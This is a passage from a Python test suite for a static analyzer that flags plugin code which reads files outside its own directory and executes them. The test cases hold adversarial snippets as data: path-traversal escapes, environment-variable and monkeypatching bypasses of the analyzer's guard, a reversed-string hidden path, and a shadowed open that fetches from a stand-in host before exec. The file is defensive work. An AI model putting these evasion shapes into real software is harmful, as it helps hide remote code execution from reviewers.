    ("E3-tmpdir-env-get", "pkg/mod.py",
     _rd("os.path.join(here, os.environ.get('TMPDIR', '/tmp'), 'x.py')", H)),
    ("E4-getenv-default-is-absolute-escape", "pkg/mod.py",
     _rd("os.path.join(here, os.getenv('NOPE', '/tmp/x.py'))", H)),
    ("E5-environ-get-default-is-absolute-escape", "pkg/mod.py",
     _rd("os.path.join(here, os.environ.get('NOPE', '/tmp/x.py'))", H)),
    ("E6-getenv-or-absolute-escape", "pkg/mod.py",
     _rd("os.path.join(here, os.getenv('NOPE') or '/tmp/x.py')", H)),
    ("E7-environ-get-empty-prefix-then-absolute", "pkg/mod.py",
     _rd("os.path.join(here, os.environ.get('NOPE', '') + '/tmp/x.py')", H)),
    ("E8-environ-get-default-is-traversal", "pkg/mod.py",
     _rd("os.path.join(here, os.environ.get('NOPE', '../../tmp/x.py'))", H)),
]


@pytest.mark.parametrize("case_id,relpath,src", _ENV_BYPASS_CASES)
def test_env_var_bypass_convicts(case_id, relpath, src):
    assert _verdict(src, relpath) == "convict", case_id


# ---------------------------------------------------------------------------------
# B-850 round 2: runtime-segment-before-'..' regression. A runtime-computed segment
# is credited with exactly one level of depth (its worst case) -- a '..' walk that
# still goes negative even under that generous credit is a PROVEN escape (ESCAPES),
# restoring the pre-B-850 baseline's conviction on this shape, not merely UNPROVEN.
# ---------------------------------------------------------------------------------
def test_runtime_segment_then_dotdot_still_convicts():
    src = _rd(
        "os.path.join(here, os.environ.get('NOPE', ''), '..', '..', '..', 'tmp', 'x.py')", H
    )
    assert _verdict(src, "pkg/mod.py") == "convict"


def test_runtime_segment_alone_stays_warn():
    # Control: no '..' at all -- a bare runtime segment stays the ordinary UNPROVEN
    # WARN, not a convict (this fix must not over-convict the ambiguous case).
    src = _rd("os.path.join(here, os.environ['P'])", H)
    assert _verdict(src, "pkg/mod.py") == "warn"


# ---------------------------------------------------------------------------------
# B-850 round 2: codecs.open is a recognized open-call, same as builtins.open/io.open.
# ---------------------------------------------------------------------------------
def test_codecs_open_recognized_as_bounded():
    src = (
        HDR + "import codecs\n"
        "with codecs.open(os.path.join(os.path.dirname(__file__), 'v.py'), 'rb') as fh:\n"
        "    exec(fh.read().decode(), {})\n"
    )
    assert _verdict(src, "mod.py") == "clean"


# ---------------------------------------------------------------------------------
# B-850 round 2: TT5 (shell/subprocess) sinks must disclose an UNPROVEN read via
# ARTIFACT_READ_UNPROVEN (B394) the same way the direct exec()/eval() branch already
# does, instead of silently absolving it with zero signal at all.
# ---------------------------------------------------------------------------------
_TT5_HDR = "import os\nimport sys\n"


def _tt5_findings(src: str, relpath: str = "m.py"):
    return analyze_python(src, relpath)


def test_tt5_os_system_unproven_read_is_disclosed_not_silent():
    src = (
        _TT5_HDR
        + "with open(os.path.join(os.path.dirname(__file__), os.environ['P']), 'rb') as fh:\n"
        "    os.system(fh.read().decode())\n"
    )
    findings = _tt5_findings(src)
    assert not any(f.severity == "crit" for f in findings)
    assert any(f.rule == "ARTIFACT_READ_UNPROVEN" for f in findings)


def test_tt5_subprocess_unproven_read_is_disclosed_not_silent():
    src = (
        _TT5_HDR + "import subprocess\n"
        "with open(os.path.join(os.path.dirname(__file__), os.environ['P']), 'rb') as fh:\n"
        "    subprocess.run(fh.read().decode(), shell=True)\n"
    )
    findings = _tt5_findings(src)
    assert not any(f.severity == "crit" for f in findings)
    assert any(f.rule == "ARTIFACT_READ_UNPROVEN" for f in findings)


def test_tt5_bounded_read_still_stays_fully_silent():
    # Control: a BOUNDED (fully literal, artifact-relative, no runtime segment) read
    # through a TT5 sink must stay silently exempt -- no ARTIFACT_READ_UNPROVEN, no
    # crit. Only UNPROVEN gets the disclosure. (A literal, non-artifact-relative read
    # like '/tmp/x.sh' would be NOT_ANCHORED, not BOUNDED, so it would convict instead
    # -- not a useful control for this specific assertion.)
    src = (
        _TT5_HDR
        + "with open(os.path.join(os.path.dirname(__file__), 'x.sh'), 'rb') as fh:\n"
        "    os.system(fh.read().decode())\n"
    )
    findings = _tt5_findings(src)
    assert not any(f.severity == "crit" for f in findings)
    assert not any(f.rule == "ARTIFACT_READ_UNPROVEN" for f in findings)


# ---------------------------------------------------------------------------------
# Wiring: the checks/_vet.py B394 bucket (WARN, never FAIL) and the standalone
# check_artifact_read_unproven (SKILL_CONTENT_RING member).
# ---------------------------------------------------------------------------------


def test_b13_bad_artifact_read_unproven_is_warn_not_fail():
    ctx = collect(FIXTURES / "bad_b394_artifact_read_unproven")
    f = check_installed_skills(ctx)
    assert f.status == WARN
    assert f.severity == "MEDIUM"


def test_b13_clean_bounded_plugin_read_stays_pass():
    ctx = collect(FIXTURES / "clean_b394_bounded_plugin_read")
    f = check_installed_skills(ctx)
    assert f.status == PASS


def test_standalone_check_bad_fixture_warns():
    ctx = collect(FIXTURES / "bad_b394_artifact_read_unproven")
    f = check_artifact_read_unproven(ctx)
    assert f.status == WARN
    assert f.id == "B394"


def test_standalone_check_clean_fixture_passes():
    ctx = collect(FIXTURES / "clean_b394_bounded_plugin_read")
    f = check_artifact_read_unproven(ctx)
    assert f.status == PASS
    assert f.id == "B394"


# ---------------------------------------------------------------------------------
# B-850 round 3 (C-135 rejection of 2b4d6dc2): the fail-closed guard used to match by
# NAME SPELLING (any Store/Del of an attribute spelled join/open/path/..., a fixed
# handful of bare-Name spellings) regardless of the base object -- both a false-FAIL
# blocker (self.path = p, setattr(self, k, v), self.__dict__.update(kw), ... is
# ordinary code, no module in sight) and a bypass surface (any spelling the guard
# didn't happen to enumerate). It is now RESOLUTION-based: only fires when the target
# actually resolves to a sensitive namespace (os/os.path/sys/builtins/pathlib, a class
# pulled from one of them, or a module reached dynamically via sys.modules/importlib/
# __import__ under any alias).
# ---------------------------------------------------------------------------------
_R3_FALSE_POSITIVE_CASES = [
    # FP1 is the highest-priority fix in this round: the self.path-style shape is
    # extremely common, ordinary Python and was the primary real-fleet risk.
    ("FP1-self-path-assignment", "pkg/mod.py",
     _rd("os.path.join(here, 'v.py')", H)
     + "class Store:\n    def __init__(self, p):\n        self.path = p\n"),
    ("FP2-setattr-on-self", "pkg/mod.py",
     _rd("os.path.join(here, 'v.py')", H)
     + "class Cfg:\n    def __init__(self, **kw):\n        for k, v in kw.items():\n"
     "            setattr(self, k, v)\n"),
    ("FP3-self-dict-update", "pkg/mod.py",
     _rd("os.path.join(here, 'v.py')", H)
     + "class Cfg:\n    def __init__(self, **kw):\n        self.__dict__.update(kw)\n"),
    ("FP4-self-open-attribute", "pkg/mod.py",
     _rd("os.path.join(here, 'v.py')", H)
     + "class Door:\n    def __init__(self):\n        self.open = False\n"),
    ("FP5-vars-read-only", "pkg/mod.py",
     _rd("os.path.join(here, 'v.py')", H)
     + "def f(args):\n    return dict(vars(args))\n"),
]


@pytest.mark.parametrize("case_id,relpath,src", _R3_FALSE_POSITIVE_CASES)
def test_ordinary_attribute_mutation_on_a_non_sensitive_base_stays_clean(case_id, relpath, src):
    assert _verdict(src, relpath) == "clean", case_id


_R3_GUARD_RESOLUTION_CASES = [
    # A representative spread across the four bypass shapes the resolution-based
    # redesign closes without a per-spelling special case (the full G1-G19 battery
    # lives in the reviewer's own corpus, not reproduced here).
    ("R3G1-builtins-setattr-indirection", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
         "import builtins\nbuiltins.setattr(os.path, 'join', lambda *a: '/tmp/x.py')\n")),
    ("R3G6-sysmodules-under-an-alias", "pkg/mod.py",
     "import sys as s\n"
     + _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
           "s.modules[__name__].__file__ = '/tmp/e/y.py'\n")),
    ("R3G13-exec-of-compiled-literal", "pkg/mod.py",
     _rd("os.path.join(os.path.dirname(__file__), 'x.py')",
         "exec(compile(\"__file__ = '/tmp/e/y.py'\", 'c', 'exec'))\n")),
    ("R3G17-pathlib-class-attribute-patched", "pkg/mod.py",
     _rd("Path(__file__).parent / 'x.py'",
         "Path.parent = property(lambda s: Path('/tmp'))\n")),
]


@pytest.mark.parametrize("case_id,relpath,src", _R3_GUARD_RESOLUTION_CASES)
def test_resolution_based_guard_convicts(case_id, relpath, src):
    assert _verdict(src, relpath) == "convict", case_id


def test_lambda_in_comprehension_captures_the_comprehension_shadow():
    # B-850 round 3 (L1): `_containment_comp_iters` used to stop at a `Lambda` --
    # `[(lambda: open(...))() for open in [...]]` shadows the builtin `open` inside the
    # lambda's body, a FREE name captured from the comprehension, not one of the
    # lambda's own (zero) parameters.
    src = (
        HDR + "import urllib.request\n"
        "[(lambda: exec(open(os.path.join(os.path.dirname(__file__), 'x.py'), 'rb')"
        ".read().decode()))() for open in "
        "[lambda *a, **k: urllib.request.urlopen('http://e.example/p')]]\n"
    )
    assert _verdict(src, "pkg/mod.py") == "convict"


def test_walrus_read_before_it_in_argument_order_still_convicts():
    # B-850 round 3 (W1): this round's OWN regression. `_bind` used to REPLACE the
    # prior definition with the walrus's, so a read evaluated BEFORE the walrus in
    # real left-to-right argument order (the first `exec()` argument reads `here`;
    # only the SECOND rebinds it) wrongly saw only the walrus's post-value. Reads now
    # see the MERGE of both -- worst-verdict-wins keeps this convicted regardless of
    # which one the read "really" sees.
    src = (
        HDR + "here = '/tmp'\n"
        "exec(open(os.path.join(here, 'x.py'), 'rb').read().decode(), "
        "{} if (here := os.path.dirname(__file__)) else {})\n"
    )
    assert _verdict(src, "pkg/mod.py") == "convict"


def test_walrus_in_a_statically_dead_boolop_branch_does_not_taint_later_reads():
    # B-850 round 3 (W2): a walrus inside `False and (...)` never executes -- it must
    # not overwrite (or even merge into) the real prior binding of `here`, which stays
    # '/tmp' (NOT_ANCHORED) here. Inherited from round 1, not newly introduced this
    # round.
    src = (
        HDR + "here = '/tmp'\n_ = False and (here := os.path.dirname(__file__))\n"
        + _rd("os.path.join(here, 'x.py')")
    )
    assert _verdict(src, "pkg/mod.py") == "convict"


def test_str_join_reversed_hidden_escape_convicts():
    # B-850 round 3 (D1, staticness rework): a deterministic transform of purely
    # literal arguments (`''.join(reversed('lit'))`) is just as foldable-in-principle
    # as a PURE_FUNCS decoder like base64 -- round 2's blanket "any non-pure resolvable
    # call -> runtime" rule wrongly downgraded this whole family to a bare
    # runtime/UNPROVEN WARN instead of the correct static/ESCAPES conviction.
    src = _rd("os.path.join(here, ''.join(reversed('yp.x/pmt/../../..')))", H)
    assert _verdict(src, "pkg/mod.py") == "convict"
